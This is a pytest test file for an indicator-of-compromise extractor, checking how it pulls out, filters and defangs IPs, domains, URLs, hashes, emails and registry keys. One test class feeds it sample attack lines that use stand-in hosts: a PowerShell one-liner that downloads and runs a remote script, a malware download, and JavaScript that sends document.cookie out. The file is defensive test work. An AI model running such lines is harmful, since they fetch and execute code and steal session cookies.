"""Tests for the IOC (Indicators of Compromise) extractor."""

import sys
import os
import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from analyzers.ioc_extractor import IOCExtractor


# ---------------------------------------------------------------------------
# Fixture
# ---------------------------------------------------------------------------

@pytest.fixture
def extractor():
    """Provide a fresh IOCExtractor instance."""
    return IOCExtractor()


# ===================================================================
# IPv4 Address Extraction
# ===================================================================

class TestIPExtraction:
    """Tests for IP address extraction."""

    def test_extract_valid_public_ipv4(self, extractor):
        content = "Connection to 8.8.8.8 on port 443"
        result = extractor.extract(content)
        assert "ip" in result
        assert "8.8.8.8" in result["ip"]

    def test_extract_multiple_public_ips(self, extractor):
        content = "Contacted 203.0.113.5 and then 198.51.100.22 for C2."
        result = extractor.extract(content)
        assert "ip" in result
        assert "203.0.113.5" in result["ip"]
        assert "198.51.100.22" in result["ip"]

    def test_skip_loopback_ip(self, extractor):
        content = "Listening on 127.0.0.1:8080"
        result = extractor.extract(content)
        assert "ip" not in result or "127.0.0.1" not in result.get("ip", [])

    def test_skip_all_zeros_ip(self, extractor):
        content = "Binding to 0.0.0.0:80"
        result = extractor.extract(content)
        assert "ip" not in result or "0.0.0.0" not in result.get("ip", [])

    def test_skip_private_10_range(self, extractor):
        content = "Internal host 10.0.0.1 responded"
        result = extractor.extract(content)
        assert "ip" not in result or "10.0.0.1" not in result.get("ip", [])

    def test_skip_private_172_range(self, extractor):
        content = "Gateway at 172.16.0.1"
        result = extractor.extract(content)
        assert "ip" not in result or "172.16.0.1" not in result.get("ip", [])

    def test_skip_private_192_168_range(self, extractor):
        content = "Router at 192.168.1.1"
        result = extractor.extract(content)
        assert "ip" not in result or "192.168.1.1" not in result.get("ip", [])

    def test_skip_link_local_169_254(self, extractor):
        content = "APIPA address 169.254.1.1"
        result = extractor.extract(content)
        assert "ip" not in result or "169.254.1.1" not in result.get("ip", [])

    def test_include_private_ips_when_flag_set(self, extractor):
        content = "Internal host 10.0.0.1 and 192.168.1.1"
        result = extractor.extract(content, include_private_ips=True)
        assert "ip" in result
        assert "10.0.0.1" in result["ip"]
        assert "192.168.1.1" in result["ip"]

    def test_ip_boundary_values(self, extractor):
        content = "Server at 255.255.255.255 and 1.1.1.1"
        result = extractor.extract(content)
        assert "ip" in result
        assert "1.1.1.1" in result["ip"]


# ===================================================================
# Domain Extraction
# ===================================================================

class TestDomainExtraction:
    """Tests for domain name extraction."""

    def test_extract_valid_domain(self, extractor):
        content = "Beacon to evil-domain.xyz every 60 seconds"
        result = extractor.extract(content)
        assert "domain" in result
        assert "evil-domain.xyz" in result["domain"]

    def test_extract_subdomain(self, extractor):
        content = "Callback to c2.attacker.tk for tasking"
        result = extractor.extract(content)
        assert "domain" in result
        assert "c2.attacker.tk" in result["domain"]

    def test_skip_benign_microsoft_com(self, extractor):
        content = "Connects to microsoft.com for updates"
        result = extractor.extract(content)
        assert "domain" not in result or "microsoft.com" not in result.get("domain", [])

    def test_skip_benign_google_com(self, extractor):
        content = "DNS query to google.com"
        result = extractor.extract(content)
        assert "domain" not in result or "google.com" not in result.get("domain", [])

    def test_skip_benign_github_com(self, extractor):
        content = "Downloaded from github.com"
        result = extractor.extract(content)
        assert "domain" not in result or "github.com" not in result.get("domain", [])

    def test_skip_example_com(self, extractor):
        content = "See example.com for details"
        result = extractor.extract(content)
        assert "domain" not in result or "example.com" not in result.get("domain", [])

    def test_extract_onion_domain(self, extractor):
        content = "Hidden service at abcdefghij1234567.onion"
        result = extractor.extract(content)
        assert "domain" in result
        assert "abcdefghij1234567.onion" in result["domain"]

    def test_domain_case_insensitive(self, extractor):
        content = "Reached out to EVIL-SERVER.XYZ"
        result = extractor.extract(content)
        assert "domain" in result
        assert "evil-server.xyz" in result["domain"]

    def test_multiple_tlds(self, extractor):
        content = "malware.ru and dropper.cn and phishing.co"
        result = extractor.extract(content)
        assert "domain" in result
        extracted = result["domain"]
        assert "malware.ru" in extracted
        assert "dropper.cn" in extracted
        assert "phishing.co" in extracted


# ===================================================================
# URL Extraction
# ===================================================================

class TestURLExtraction:
    """Tests for URL extraction."""

    def test_extract_http_url(self, extractor):
        content = "Download from http://malware-server.xyz/payload.exe"
        result = extractor.extract(content)
        assert "url" in result
        assert "http://malware-server.xyz/payload.exe" in result["url"]

    def test_extract_https_url(self, extractor):
        content = "C2 at https://c2.evil.tk/gate.php"
        result = extractor.extract(content)
        assert "url" in result
        assert "https://c2.evil.tk/gate.php" in result["url"]

    def test_extract_defanged_url(self, extractor):
        content = "Payload at hxxps://malware[.]xyz/drop"
        result = extractor.extract(content)
        assert "url" in result
        # The extractor should refang hxxps -> https and [.] -> .
        urls = result["url"]
        assert any("malware" in u and "drop" in u for u in urls)

    def test_url_minimum_length_filter(self, extractor):
        """URLs shorter than 10 chars should be excluded."""
        content = "Visit http://x.c"
        result = extractor.extract(content)
        # "http://x.c" is 10 chars exactly, should be excluded since <=10
        assert "url" not in result or len(result.get("url", [])) == 0

    def test_ftp_url_extraction(self, extractor):
        content = "Files hosted at ftp://files.malware.xyz/samples/"
        result = extractor.extract(content)
        assert "url" in result
        assert any("ftp://files.malware.xyz" in u for u in result["url"])


# ===================================================================
# Hash Extraction
# ===================================================================

class TestHashExtraction:
    """Tests for MD5, SHA1, and SHA256 hash extraction."""

    def test_extract_md5(self, extractor):
        md5 = "d41d8cd98f00b204e9800998ecf8427e"
        content = f"File hash: {md5}"
        result = extractor.extract(content)
        assert "hash_md5" in result
        assert md5 in result["hash_md5"]

    def test_extract_sha1(self, extractor):
        sha1 = "da39a3ee5e6b4b0d3255bfef95601890afd80709"
        content = f"SHA1: {sha1}"
        result = extractor.extract(content)
        assert "hash_sha1" in result
        assert sha1 in result["hash_sha1"]

    def test_extract_sha256(self, extractor):
        sha256 = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        content = f"SHA256: {sha256}"
        result = extractor.extract(content)
        assert "hash_sha256" in result
        assert sha256 in result["hash_sha256"]

    def test_sha1_not_extracted_as_md5_when_sha256_present(self, extractor):
        """SHA256 hashes should not have their first 40 chars extracted as SHA1."""
        sha256 = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        content = f"Hash: {sha256}"
        result = extractor.extract(content)
        assert "hash_sha256" in result
        # The first 40 chars of the sha256 should NOT appear as a sha1
        sha1_prefix = sha256[:40]
        sha1_list = result.get("hash_sha1", [])
        assert sha1_prefix not in sha1_list

    def test_md5_not_extracted_from_longer_hash(self, extractor):
        """MD5-length substrings of SHA1/SHA256 should not be extracted."""
        sha1 = "da39a3ee5e6b4b0d3255bfef95601890afd80709"
        content = f"Only SHA1: {sha1}"
        result = extractor.extract(content)
        md5_list = result.get("hash_md5", [])
        # The first 32 chars of the sha1 should NOT appear as MD5
        assert sha1[:32] not in md5_list

    def test_hashes_lowercased(self, extractor):
        md5_upper = "D41D8CD98F00B204E9800998ECF8427E"
        content = f"Hash: {md5_upper}"
        result = extractor.extract(content)
        assert "hash_md5" in result
        assert md5_upper.lower() in result["hash_md5"]

    def test_multiple_different_hashes(self, extractor):
        md5 = "d41d8cd98f00b204e9800998ecf8427e"
        sha256 = "a948904f2f0f479b8f8564e9f13d1b7e9e4c4a0e3e7e9f1a2b3c4d5e6f708192"
        content = f"MD5: {md5}\nSHA256: {sha256}"
        result = extractor.extract(content)
        assert "hash_md5" in result
        assert "hash_sha256" in result


# ===================================================================
# Email Extraction
# ===================================================================

class TestEmailExtraction:
    """Tests for email address extraction."""

    def test_extract_email(self, extractor):
        content = "Report to analyst@security-team.org"
        result = extractor.extract(content)
        assert "email" in result
        assert "analyst@security-team.org" in result["email"]

    def test_extract_multiple_emails(self, extractor):
        content = "Contact admin@evil.xyz or support@malware.ru"
        result = extractor.extract(content)
        assert "email" in result
        assert "admin@evil.xyz" in result["email"]
        assert "support@malware.ru" in result["email"]

    def test_email_lowercased(self, extractor):
        content = "Email: ADMIN@Evil.XYZ"
        result = extractor.extract(content)
        assert "email" in result
        assert "admin@evil.xyz" in result["email"]


# ===================================================================
# IOC Categorization
# ===================================================================

class TestIOCCategorization:
    """Tests that IOCs are correctly grouped by type."""

    def test_mixed_iocs_categorized(self, extractor):
        content = """
        IP: 8.8.4.4
        Domain: evil-c2.xyz
        URL: https://payload.tk/dropper.exe
        MD5: d41d8cd98f00b204e9800998ecf8427e
        Email: attacker@evil-c2.xyz
        """
        result = extractor.extract(content)
        assert "ip" in result
        assert "domain" in result or "url" in result
        assert "hash_md5" in result
        assert "email" in result

    def test_empty_categories_not_in_result(self, extractor):
        """The extract method should only return keys for types that have values."""
        content = "Just an IP: 8.8.8.8"
        result = extractor.extract(content)
        assert "ip" in result
        # Types with no matches should be absent
        assert "hash_sha256" not in result
        assert "registry_key" not in result

    def test_registry_key_extraction(self, extractor):
        content = r"Persistence via HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\evil"
        result = extractor.extract(content)
        assert "registry_key" in result
        assert any("HKEY_LOCAL_MACHINE" in k for k in result["registry_key"])


# ===================================================================
# Real-World-Like Malware Samples
# ===================================================================

class TestRealWorldSamples:
    """Tests with realistic malware script samples."""

    def test_powershell_encoded_url_sample(self, extractor):
        """PowerShell script with DownloadString to a malicious URL."""
        ps_content = """
        powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('https://evil-payload.xyz/stage1.ps1')"
        $callback = "http://c2-server.tk:8443/beacon"
        Invoke-WebRequest -Uri $callback -Method POST
        """
        result = extractor.extract_from_script(ps_content, script_type="powershell")
        urls = result.get("url", [])
        assert any("evil-payload.xyz" in u for u in urls)
        assert any("c2-server.tk" in u for u in urls)

    def test_javascript_dom_callback(self, extractor):
        """JavaScript with XMLHttpRequest callback to C2."""
        js_content = """
        var x = new XMLHttpRequest();
        x.open("POST", "https://exfil-data.xyz/collect.php");
        x.send(document.cookie);
        var img = new Image();
        img.src = "https://tracking.evil.tk/pixel.gif?data=" + btoa(document.cookie);
        """
        result = extractor.extract_from_script(js_content, script_type="javascript")
        urls = result.get("url", [])
        assert any("exfil-data.xyz" in u for u in urls)
        assert any("tracking.evil.tk" in u for u in urls)

    def test_powershell_invoke_webrequest_extraction(self, extractor):
        """PowerShell Invoke-WebRequest pattern extracted by script-specific handler."""
        ps_content = """
        Invoke-WebRequest https://dropper.pw/malware.exe -OutFile C:\\temp\\malware.exe
        iwr https://backup-c2.xyz/config.txt -OutFile config.txt
        """
        result = extractor.extract_from_script(ps_content, script_type="powershell")
        urls = result.get("url", [])
        assert any("dropper.pw" in u for u in urls)
        assert any("backup-c2.xyz" in u for u in urls)

    def test_vbscript_msxml_open(self, extractor):
        """VBScript pattern with MSXML .Open method."""
        vbs_content = """
        Set http = CreateObject("MSXML2.XMLHTTP")
        http.Open "GET", "https://vbs-c2.xyz/payload.vbs", False
        http.Send
        """
        result = extractor.extract_from_script(vbs_content, script_type="vbscript")
        urls = result.get("url", [])
        assert any("vbs-c2.xyz" in u for u in urls)


# ===================================================================
# Empty / No-IOC Content
# ===================================================================

class TestEmptyContent:
    """Tests for content that contains no IOCs."""

    def test_empty_string(self, extractor):
        result = extractor.extract("")
        assert result == {}

    def test_no_iocs_in_normal_text(self, extractor):
        content = "This is a perfectly normal sentence with no indicators."
        result = extractor.extract(content)
        assert result == {}

    def test_whitespace_only(self, extractor):
        result = extractor.extract("   \n\t\n   ")
        assert result == {}


# ===================================================================
# Defang / Refang
# ===================================================================

class TestDefangRefang:
    """Tests for IOC defanging and refanging."""

    def test_defang_ip(self, extractor):
        assert extractor.defang("8.8.8.8", "ip") == "8[.]8[.]8[.]8"

    def test_defang_url(self, extractor):
        defanged = extractor.defang("https://evil.com/path", "url")
        assert "hxxps" in defanged
        assert "[.]" in defanged

    def test_defang_domain(self, extractor):
        assert extractor.defang("evil.com", "domain") == "evil[.]com"

    def test_defang_email(self, extractor):
        defanged = extractor.defang("user@evil.com", "email")
        assert "[@]" in defanged
        assert "[.]" in defanged

    def test_defang_auto_detection_ip(self, extractor):
        defanged = extractor.defang("1.2.3.4")
        assert "[.]" in defanged

    def test_refang_url(self, extractor):
        refanged = extractor.refang("hxxps://evil[.]com/path")
        assert refanged == "https://evil.com/path"

    def test_refang_roundtrip(self, extractor):
        original = "https://evil.com/malware.exe"
        defanged = extractor.defang(original, "url")
        refanged = extractor.refang(defanged)
        assert refanged == original
